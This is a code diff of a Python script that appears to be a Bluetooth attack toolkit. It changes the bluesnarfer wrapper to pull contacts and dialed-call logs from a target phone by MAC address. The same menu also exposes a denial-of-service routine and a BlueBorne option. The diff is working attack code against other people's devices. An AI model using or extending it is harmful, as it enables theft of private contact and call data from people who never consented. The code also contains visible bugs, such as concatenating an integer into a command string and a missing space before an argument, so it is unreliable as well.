@@ -48,13 +48,17 @@ def bluesnarfer(mode):
     dc = 2
 
     if "list" in mode:
+        print("Listing available information...\n\n")
         os.system("sudo bluesnarfer -b "" " + mac + " -C " + pbc + " -l")
-    if "default_list" in mode:
-        os.system("sudo bluesnarfer -b "" " + mac + " -C " + dc + " -l")
+    if "contacts" in mode:
+        print("Listing available contacts...\n\n")
+        os.system("sudo bluesnarfer -b "" " + mac + " -C " + dc + " -r 1-100 -s ME")
     elif "info" in mode:
+        print("Showing device info...\n\n")
         os.system("bluesnarfer -i -b " + mac)
-    elif "pb" in mode:
-        os.system("sudo bluesnarfer -b "" " + mac + " -r 1-100 -C " + pbc + " ME")
+    elif "calls" in mode:
+        print("Listing last dialed calls...\n\n")
+        os.system("sudo bluesnarfer -b "" " + mac + " -r 1-100 -C " + pbc + "-s DC")
     else:
         print("Invalid action.")
 
@@ -107,7 +111,7 @@ def main():
         elif "5" in action:
             jieggi_DoS()
         elif "6" in action:
-            mode = input("\n\nChoose action (list, default_list, pb or info): ")
+            mode = input("\n\nChoose action (list, contacts, calls or info): ")
             bluesnarfer(mode)
         elif "7" in action:
             blueborne()
